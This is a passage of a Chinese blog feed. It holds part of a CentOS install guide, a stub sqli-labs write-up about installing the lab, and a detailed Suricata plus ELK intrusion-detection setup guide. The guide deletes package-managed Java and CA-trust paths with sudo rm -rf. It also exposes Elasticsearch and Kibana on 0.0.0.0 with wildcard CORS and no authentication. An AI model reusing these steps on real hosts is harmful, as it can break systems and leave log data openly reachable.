alt="1603249382172"></p><p>输入相关用户名密码，点击左上角done即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249407944.png" alt="1603249407944"></p><p>等待系统安装完毕重启系统即可。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249729806.png" alt="1603249729806"></p><h1 id="4-常见网络配置"><a href="#4-常见网络配置" class="headerlink" title="4 常见网络配置"></a>4 常见网络配置</h1><p>REF：</p><p><a href="https://blog.csdn.net/babyxue/article/details/80970526">超级详细的安装教程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安装教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>writeup-sqli-labs</title>
      <link href="/2020/09/11/writeup-sqli-labs/"/>
      <url>/2020/09/11/writeup-sqli-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><h1 id="1-sqli-labs安装"><a href="#1-sqli-labs安装" class="headerlink" title="1 sqli-labs安装"></a>1 sqli-labs安装</h1><p>因为XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、<a href="https://baike.baidu.com/item/Linux">Linux</a>、Solaris、Mac OS X 等多种操作系统下安装使用。</p><p>因此我是打算在windows平台安装 XAMPP即可运行sqli-labs，下载地址如下：</p><p><a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a></p><p>启动xampp,start Apache,无法启动的可能是相关端口占用，解决办法如下：</p><p><a href="https://blog.csdn.net/caizhigui/article/details/50332995">https://blog.csdn.net/caizhigui/article/details/50332995</a></p><p>sqli-labs源码地址：</p><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elk笔记一---suricata+elk搭建入侵检测系统</title>
      <link href="/2020/09/11/install-guide-elk-suricata/"/>
      <url>/2020/09/11/install-guide-elk-suricata/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1 引言"></a>1 引言</h1><p>最近有一个工作任务，需要利用Suricata作为IDS来检测出口流量，同时利用ELK进行数据的展示。看了很多suricata+elk进行流量监测的文章，但是都不太符合要求。</p><a id="more"></a><h1 id="2-部署架构"><a href="#2-部署架构" class="headerlink" title="2 部署架构"></a>2 部署架构</h1><p>整个架构如下表所示，有台机器装suricata用于分析流量，并装elk负责数据展示，后面数据量太大可能涉及elk集群，这里先不做考虑，仅仅自己实验。</p><table><thead><tr><th>机器</th><th>部署内容</th><th>IP</th></tr></thead><tbody><tr><td>流量分析和数据展示机器，称之为ids主机</td><td>ELK数据展示+suricata分析流量</td><td>多个集群</td></tr><tr><td>流量收集集群</td><td>抓取集群流量</td><td>10.0.0.1</td></tr></tbody></table><p>这个架构我们提供两种流量分析模式。</p><p>一种为在线模式：正常做法都是利用镜像流量，将所有集群抓取到的流量镜像到suricata机器，suricata实时在线处理这些流量,再elk展示出来。</p><p>二离线模式：但是因为机器是部署在阿里云上的，因此做镜像流量较困难，当然采用Amazon VPC功能可以实现镜像流量，如<a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/"> VPC Traffic Mirroring 构建网络入侵检测系统</a>文章，这里我们没有购买此产品，初步架构部署为离线模式。即流量收集集群将抓取的流量文件推送到suricata主机上，suricata -r分析流量文件包，产生log日志，然后elk将log数据展示出来。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1611038936479.png" alt="1611038936479"></p><h1 id="3-环境部署"><a href="#3-环境部署" class="headerlink" title="3 环境部署"></a>3 环境部署</h1><h2 id="3-1-suricata部署"><a href="#3-1-suricata部署" class="headerlink" title="3.1 suricata部署"></a>3.1 suricata部署</h2><p>suricata的安装教程看<a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">前文</a>，安装好suricata后，然后按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a>配置相关支持Elk属性即可。</p><h3 id="3-1-1-确认suricata安装了libjansson"><a href="#3-1-1-确认suricata安装了libjansson" class="headerlink" title="3.1.1 确认suricata安装了libjansson"></a>3.1.1 确认suricata安装了libjansson</h3><p>如下查看配置信息，确认  libjansson support:为yes即可</p><pre class="line-numbers language-bash"><code class="language-bash">$ suricata --build-infoThis is Suricata version 2.0 RELEASEFeatures: NFQ PCAP_SET_BUFF LIBPCAP_VERSION_MAJOR<span class="token operator">=</span>1 AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK HAVE_NSS HAVE_LIBJANSSON <span class="token punctuation">..</span>.  libnss support:                          <span class="token function">yes</span>  libnspr support:                         <span class="token function">yes</span>  libjansson support:                     --<span class="token operator">></span> <span class="token function">yes</span> <span class="token operator">&lt;</span>--  Prelude support:                         no  PCRE jit:                                no  libluajit:                               no  libgeoip:                                <span class="token function">yes</span>  Non-bundled htp:                         <span class="token function">yes</span>  Old barnyard2 support:                   no  CUDA enabled:                            no<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-修改配置文件"><a href="#3-1-2-修改配置文件" class="headerlink" title="3.1.2  修改配置文件"></a>3.1.2  修改配置文件</h3><p>修改配置文件suricata.yaml如下</p><pre class="line-numbers language-yaml"><code class="language-yaml">  <span class="token comment" spellcheck="true"># "United" event log in JSON format</span>  <span class="token punctuation">-</span> <span class="token key atrule">eve-log</span><span class="token punctuation">:</span>      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> yes      <span class="token key atrule">type</span><span class="token punctuation">:</span> file <span class="token comment" spellcheck="true">#file|syslog|unix_dgram|unix_stream</span>      <span class="token key atrule">filename</span><span class="token punctuation">:</span> eve.json      <span class="token comment" spellcheck="true"># the following are valid when type: syslog above</span>      <span class="token comment" spellcheck="true">#identity: "suricata" </span>      <span class="token comment" spellcheck="true">#facility: local5</span>      <span class="token comment" spellcheck="true">#level: Info ## possible levels: Emergency, Alert, Critical,</span>                   <span class="token comment" spellcheck="true">## Error, Warning, Notice, Info, Debug</span>      <span class="token key atrule">types</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> alert        <span class="token punctuation">-</span> <span class="token key atrule">http</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> dns        <span class="token punctuation">-</span> <span class="token key atrule">tls</span><span class="token punctuation">:</span>            <span class="token key atrule">extended</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># enable this for extended logging information</span>        <span class="token punctuation">-</span> <span class="token key atrule">files</span><span class="token punctuation">:</span>            <span class="token key atrule">force-magic</span><span class="token punctuation">:</span> yes   <span class="token comment" spellcheck="true"># force logging magic on all logged files</span>            <span class="token key atrule">force-md5</span><span class="token punctuation">:</span> yes     <span class="token comment" spellcheck="true"># force logging of md5 checksums</span>        <span class="token comment" spellcheck="true">#- drop</span>        <span class="token punctuation">-</span> ssh        <span class="token punctuation">-</span> smtp        <span class="token punctuation">-</span> flow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装ES"><a href="#3-2-安装ES" class="headerlink" title="3.2 安装ES"></a>3.2 安装ES</h2><h3 id="3-2-1-需要java-1-8-环境"><a href="#3-2-1-需要java-1-8-环境" class="headerlink" title="3.2.1 需要java 1.8 环境"></a>3.2.1 需要java 1.8 环境</h3><p>ES安装需要java1.8环境，因此需要先检查主机是否有java1.8环境。</p><p> <a href="http://www.justdojava.com/2019/08/11/elk-install/">http://www.justdojava.com/2019/08/11/elk-install/</a> </p><p><img src="/2020/09/11/install-guide-elk-suricata/1603867131448.png" alt="1603867131448"></p><p>（1）查看java版本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603862442212.png" alt="1603862442212"></p><p>（2）卸载旧版本（这里注意centos7自带的是1.8的jre，需要卸载掉/或者yum -y install java-1.8.0-openjdk安装的也仅仅是jre）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）安装1.8版本java</p><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，而那个不带-devel的安装完了其实是jre。 </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603870468396.png" alt="1603870468396"></p><p>（4）修改环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603867783946.png" alt="1603867783946"></p><h3 id="3-2-2安装"><a href="#3-2-2安装" class="headerlink" title="3.2.2安装"></a>3.2.2安装</h3><p><a href="https://www.elastic.co/cn/downloads/elasticsearch">官网下载</a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603803405841.png" alt="1603803405841"></p><p>安装目录： 一般是装在/usr/share/elasticsearch/下。 </p><p>报错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603866798862.png" alt="1603866798862"></p><p>解决办法：删除其他版本的java</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -name java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603866831066.png" alt="1603866831066"></p><p>版本太低 ，都删除，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.7.0_79/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /opt/jdk1.8.0_60/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3设置data的目录"><a href="#3-2-3设置data的目录" class="headerlink" title="3.2.3设置data的目录"></a>3.2.3设置data的目录</h3><p>创建/data/es-data目录，用于elasticsearch数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R elasticsearch:elasticsearch /data/es-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4设置log的目录"><a href="#3-2-4设置log的目录" class="headerlink" title="3.2.4设置log的目录"></a>3.2.4设置log的目录</h3><p>创建/data/es-log目录，用于elasticsearch日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为elasticsearch</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R elasticsearch:elasticsearch /log/es-log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-5-修改配置文件elasticsearch-yml"><a href="#3-2-5-修改配置文件elasticsearch-yml" class="headerlink" title="3.2.5 修改配置文件elasticsearch.yml"></a>3.2.5 修改配置文件elasticsearch.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/elasticsearch/elasticsearch.yml<span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml#查看配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#设置data存放的路径为/data/es-data</span>path.data: /data/es-data<span class="token comment" spellcheck="true">#设置logs日志的路径为/log/es-log</span>path.logs: /log/es-log<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200<span class="token comment" spellcheck="true">#节点名称</span>node.name: node-1<span class="token comment" spellcheck="true">#增加新的参数，为了让elasticsearch-head插件可以访问es (5.x版本，如果没有可以自己手动加)</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-6启动elasticsearch"><a href="#3-2-6启动elasticsearch" class="headerlink" title="3.2.6启动elasticsearch"></a>3.2.6启动elasticsearch</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start elasticsearch<span class="token comment" spellcheck="true">#启动   </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出错1：</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603863067395.png" alt="1603863067395"></p><p>solution:配置文件加下面代码：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">bootstrap.system_call_filter</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token key atrule">cluster.initial_master_nodes</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看状态</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> elasticsearch <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功之后，测试服务是否开启</p><pre class="line-numbers language-bash"><code class="language-bash">curl -X GET http://localhost:9200 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805643890.png" alt="1603805643890"></p><h3 id="3-2-7-卸载"><a href="#3-2-7-卸载" class="headerlink" title="3.2.7 卸载"></a>3.2.7 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove elasticsearch<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/elasticsearch/<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/elasticsearch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-logStash"><a href="#3-3-logStash" class="headerlink" title="3.3  logStash"></a>3.3  logStash</h2><h3 id="3-3-1-下载安装"><a href="#3-3-1-下载安装" class="headerlink" title="3.3.1 下载安装"></a>3.3.1 下载安装</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603805962140.png" alt="1603805962140"></p><h3 id="3-2-2设置data的目录"><a href="#3-2-2设置data的目录" class="headerlink" title="3.2.2设置data的目录"></a>3.2.2设置data的目录</h3><p>创建/data/ls-data目录，用于logstash数据的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /data/ls-data <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-3设置log的目录"><a href="#3-3-3设置log的目录" class="headerlink" title="3.3.3设置log的目录"></a>3.3.3设置log的目录</h3><p>创建/data/ls-log目录，用于logstash日志的存放</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改该目录的拥有者为logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R logstash:logstash /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-4设置conf-d的目录，创建配置文件"><a href="#3-3-4设置conf-d的目录，创建配置文件" class="headerlink" title="3.3.4设置conf.d的目录，创建配置文件"></a>3.3.4设置conf.d的目录，创建配置文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">cd</span> /etc/logstash <span class="token comment" spellcheck="true">#创建conf.d的目录 </span><span class="token function">mkdir</span> conf.d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建配置文件，日志内容输出到elasticsearch中，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/conf.d/logstash.conf<span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token function">chown</span> root /etc/logstash/conf.d/logstash.conf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>logstash.conf 文件内容如下：注意其中的path为suricata日志：/var/log/suricata/eve.json</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>  file &amp;<span class="token comment" spellcheck="true">#123;</span>    path =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"/var/log/suricata/eve.json"</span><span class="token punctuation">]</span>    codec =<span class="token punctuation">></span> json  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>filter &amp;<span class="token comment" spellcheck="true">#123;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>  elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>    hosts =<span class="token punctuation">></span> "127.0.0.1<span class="token punctuation">:</span>9200"    index =<span class="token punctuation">></span> "suricata<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>  &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-5修改配置文件logstash-yml"><a href="#3-3-5修改配置文件logstash-yml" class="headerlink" title="3.3.5修改配置文件logstash.yml"></a>3.3.5修改配置文件logstash.yml</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/logstash/logstash.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 设置数据的存储路径为/data/ls-data </span>path.data: /data/ls-data <span class="token comment" spellcheck="true"># 设置管道配置文件路径为/etc/logstash/conf.d </span>path.config: /etc/logstash/conf.d <span class="token comment" spellcheck="true"># 设置日志文件的存储路径为/log/ls-log </span>path.logs: /log/ls-log <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-6启动logstash"><a href="#3-3-6启动logstash" class="headerlink" title="3.3.6启动logstash"></a>3.3.6启动logstash</h3><p>启动logstash命令如下，注意该命令不会指定配置文件启动。</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603951213781.png" alt="1603951213781"></p><p>查看</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置开机启动</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-7-测试logstash"><a href="#3-3-7-测试logstash" class="headerlink" title="3.3.7 测试logstash"></a>3.3.7 测试logstash</h3><p>–config.test_and_exit表示，检查测试创建的logstash.conf配置文件，是否有问题，如果没有问题，执行之后，<strong>显示Configuration OK 证明配置成功！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash  -f /etc/logstash/conf.d/logstash.conf --config.test_and_exit <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**如果报错：WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using –path.settings. **</p><p>解决办法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/logstash <span class="token function">ln</span> -s /etc/logstash ./config <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试成功！</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603806572175.png" alt="1603806572175"></p><h3 id="3-3-8-logstash指定配置进行运行"><a href="#3-3-8-logstash指定配置进行运行" class="headerlink" title="3.3.8 logstash指定配置进行运行"></a>3.3.8 logstash指定配置进行运行</h3><p>指定logstash.conf配置文件，以后台的方式运用，执行这段命令之后，需要回车一下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查logstash是否启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示如下信息，说明启动了</p><p><img src="http://www.justdojava.com/assets/images/2019/java/image-jay/a29ab2058ff04df4bac898a8759f1a47.jpg" alt="img"></p><h3 id="3-3-9-卸载"><a href="#3-3-9-卸载" class="headerlink" title="3.3.9 卸载"></a>3.3.9 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/default/logstash \/etc/logstash \/var/lib/logstash \/var/log/logstash \/usr/share/logstash \/usr/share/kibana/x-pack/plugins/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/components/metricbeat_migration/instruction_steps/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/public/views/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/lib/metrics/logstash \/usr/share/kibana/x-pack/plugins/monitoring/server/routes/api/v1/logstash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-10"><a href="#3-3-10" class="headerlink" title="3.3.10"></a>3.3.10</h3><p>找错，查看logstash运行日志</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status logstash -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-4-kibana"><a href="#3-4-kibana" class="headerlink" title="3.4  kibana"></a>3.4  kibana</h2><h3 id="3-4-1-安装"><a href="#3-4-1-安装" class="headerlink" title="3.4.1 安装"></a>3.4.1 安装</h3><p> <a href="https://www.elastic.co/cn/downloads/kibana">官网下载kibaba7.8版本</a>  </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-elk-suricata/1603808067228.png" alt="1603808067228"></p><p>搜索rpm包</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -ql kibana<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认是装在/usr/share/kibana/下。</p><h3 id="3-3-2修改kibana-yml"><a href="#3-3-2修改kibana-yml" class="headerlink" title="3.3.2修改kibana.yml"></a>3.3.2修改kibana.yml</h3><p>修改kibana的配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/kibana/kibana.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://localhost:9200"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-3启动kibana"><a href="#3-4-3启动kibana" class="headerlink" title="3.4.3启动kibana"></a>3.4.3启动kibana</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl start kibana <span class="token comment" spellcheck="true">#启动</span>systemctl status kibana<span class="token comment" spellcheck="true">#查看状态</span>systemctl <span class="token function">enable</span> kibana<span class="token comment" spellcheck="true">#设置开机启动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>kibana启动成功的界面</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603808420430.png" alt="1603808420430"></p><h3 id="3-4-4-卸载"><a href="#3-4-4-卸载" class="headerlink" title="3.4.4 卸载"></a>3.4.4 卸载</h3><pre class="line-numbers language-bash"><code class="language-bash">yum remove kibana<span class="token function">find</span> / -name kibana<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/kibana \/var/lib/kibana \/usr/share/elasticsearch/modules/kibana \/usr/share/kibana \/usr/share/logstash/modules/fb_apache/configuration/kibana \/usr/share/logstash/modules/netflow/configuration/kibana \/usr/share/logstash/x-pack/modules/arcsight/configuration/kibana 